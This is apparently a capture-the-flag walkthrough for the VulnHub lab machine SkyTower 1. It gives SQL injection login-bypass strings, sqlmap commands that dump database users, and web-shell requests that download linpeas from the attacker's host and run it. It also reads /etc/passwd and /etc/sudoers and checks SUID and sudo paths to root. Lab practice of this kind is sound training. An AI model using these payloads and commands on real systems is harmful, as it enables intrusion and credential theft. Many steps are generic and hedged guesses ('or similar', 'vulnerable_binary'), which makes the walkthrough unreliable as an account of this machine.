# SkyTower 1: OSCP Walkthrough

**Machine:** SkyTower 1
**Platform:** VulnHub
**Link:** https://www.vulnhub.com/entry/skytower-1,98/
**Difficulty:** Medium
**Category:** Web Application / SQL Injection / Automation / Privilege Escalation
**OS:** Linux
**Author:** Vulnerability Lab

---

## 🔍 Reconnaissance

```bash
nmap -sC -sV -p- -T4 <TARGET_IP>
```

**Open Ports Found:**
```
22/tcp   open  ssh         OpenSSH
80/tcp   open  http        Apache httpd
```

### Service Version Detection
```bash
nmap -sV -sC -p 22,80 <TARGET_IP>
```

### Web Server Fingerprinting
```bash
whatweb http://<TARGET_IP>
curl -I http://<TARGET_IP>
```

### Web Directory Enumeration
```bash
dirb http://<TARGET_IP> /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,html,zip,asp
dirsearch -u http://<TARGET_IP> -e php,txt,bak,html,asp,jsp
```

### Nikto Scan
```bash
nikto -h http://<TARGET_IP>
```

### Fuzzy Web Scan
```bash
ffuf -u http://<TARGET_IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -mc 200,301,302,403
```

---

## 🌐 Enumeration

### Web Application Structure
- Web application running on Apache with PHP/MySQL backend
- Login page present at `/login.php` or similar
- Admin panel accessible after authentication
- Multiple pages suggest a custom CMS or vulnerable web application
- The application has SQL injection vulnerabilities on the login form

### Login Page Analysis
```bash
curl http://<TARGET_IP>/login.php
curl http://<TARGET_IP>/admin/
dirsearch -u http://<TARGET_IP>/ -e php -i 200,302
```

### Technology Detection
```bash
whatweb http://<TARGET_IP>
nmap -v -Pn -sT -sV -p 80 --script=http-enum.nse <TARGET_IP>
```

### Source Code Review
```bash
wget -r -l 2 http://<TARGET_IP>/
grep -ri "sql\|query\|select\|union\|inject" /root/<downloaded_site>/
```

### SQL Injection Testing
```bash
# Test for SQLi on login form
curl -X POST http://<TARGET_IP>/login.php -d "username=admin&password=admin"
curl -X POST http://<TARGET_IP>/login.php -d "username=' OR '1'='1&password=' OR '1'='1"
curl -X POST http://<TARGET_IP>/login.php -d "username=admin'--&password=anything"
```

---

## 🎯 Exploitation

### Method 1: SQL Injection via Login Bypass

#### Step 1: Identify Injection Point
```bash
# Test username field with single quote
curl -X POST http://<TARGET_IP>/login.php -d "username='&password=test"
```

#### Step 2: Bypass Authentication
```bash
# Classic SQL injection bypass
curl -X POST "http://<TARGET_IP>/login.php" -d "username=admin'--&password=anything"
curl -X POST "http://<TARGET_IP>/login.php" -d "username=' OR 1=1--&password=anything"
curl -X POST "http://<TARGET_IP>/login.php" -d "username=admin' #&password=anything"
```

#### Step 3: Extract Data with sqlmap
```bash
sqlmap -u "http://<TARGET_IP>/login.php" --data="username=admin&password=admin" --batch --dbs
sqlmap -u "http://<TARGET_IP>/login.php" --data="username=admin&password=admin" -D <database_name> --tables --batch
sqlmap -u "http://<TARGET_IP>/login.php" --data="username=admin&password=admin" -D <database_name> -T users --dump --batch
```

#### Step 4: Login with Dumped Credentials
```bash
# Use credentials from SQL dump
curl -X POST "http://<TARGET_IP>/login.php" -d "username=<user>&password=<pass>" -c cookies.txt
curl http://<TARGET_IP>/admin/ -b cookies.txt
```

### Method 2: Union-Based SQL Injection

```bash
# Determine column count
sqlmap -u "http://<TARGET_IP>/search.php?id=1" --batch --columns

# Dump database
sqlmap -u "http://<TARGET_IP>/search.php?id=1" --batch --dbs
sqlmap -u "http://<TARGET_IP>/search.php?id=1" -D <db_name> -T users --dump --batch
```

### Method 3: Automation with Burp Suite

1. Intercept login request through Burp Suite Proxy
2. Send request to Intruder or Repeater
3. Test injection strings:
   ```
   admin' OR '1'='1' --
   admin' OR '1'='1'; --
   admin'/**/OR/**/'1'='1'--
   ```
4. Identify authentication bypass payload
5. Access admin panel and explore further functionality

### Method 4: Automation Tools

```bash
# using wapiti
wapiti -u http://<TARGET_IP>/ -f txt

# using zaproxy
zap-cli quick-scan -s xss,sqli,rce --start-options '-config api.disablekey=true' http://<TARGET_IP>
```

### Post-Login Enumeration
- Access the admin control panel
- Review user management functionality
- Check for file upload capabilities or code execution features
- Look for automation features (task scheduling, report generation) that might be injectable

---

## 🔑 Privilege Escalation

### Post-Exploitation Recon
```bash
whoami
id
hostname
uname -a
cat /etc/os-release
pwd
```

### System Enumeration
```bash
# List all users
cat /etc/passwd

# Check sudo permissions
sudo -l

# Check SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Check cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
```

### Web Shell Upload (if file upload was possible)
```bash
# Upload PHP webshell
# Then connect via:
curl http://<TARGET_IP>/shell.php?cmd=whoami
curl "http://<TARGET_IP>/shell.php?cmd=wget%20http://<YOUR_IP>/linpeas.sh%20-O%20/tmp/linpeas.sh"
curl "http://<TARGET_IP>/shell.php?cmd=chmod%20+x%20/tmp/linpeas.sh"
curl "http://<TARGET_IP>/shell.php?cmd=/tmp/linpeas.sh"
```

### SSH Login
If credentials were dumped from the database:
```bash
ssh <user>@<TARGET_IP>
# Try credentials from SQL dump
# username: admin/password from database or webapp users
```

### Linux PrivEsc Enumeration
```bash
# Quick enumeration script
linpeas.sh  # uploaded and executed if webshell available

# Manual checks:
find / -writable -type f 2>/dev/null | head -50
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
find / -perm -2000 -type f -exec ls -la {} \; 2>/dev/null
cat /etc/sudoers
find / -name "*.php" -perm +111 2>/dev/null
```

### Common Privesc Vectors
- **SUID binaries**: Exploit any SUID binary with known exploits via `searchsploit`
- **sudo permissions**: Run privileged commands as root
- **Writable files**: Modify system scripts or cron entries
- **Kernel exploits**: Check kernel version for known CVEs
- **Password reuse**: SSH with database credentials on localhost or other users

### Root Shell
```bash
# Exploit SUID binary
searchsploit <binary_name>
# Use found exploit
cp /path/to/exploit /tmp/
chmod +x /tmp/exploit
/tmp/exploit

# Or if sudo allows:
sudo -l
sudo /usr/bin/vulnerable_binary -p  # -p spawns root shell
```

---

## 📸 Screenshots

*No screenshots available for this machine.*

---

## ✅ Key Takeaways

- SQL injection on authentication bypass is a high-impact, low-effort entry point
- Always test both GET and POST parameters for injection
- sqlmap automates exploitation but manual validation confirms results
- Automation tools like Burp Suite Intruder speed up injection testing significantly
- Post-exploitation enumeration (SUID, sudo, cron) is critical for escalation
- Database credential leakage often provides lateral movement paths
- Web application user accounts frequently share passwords with system accounts

---

> M4d3 w1th ❤️ by Ankit Patidar
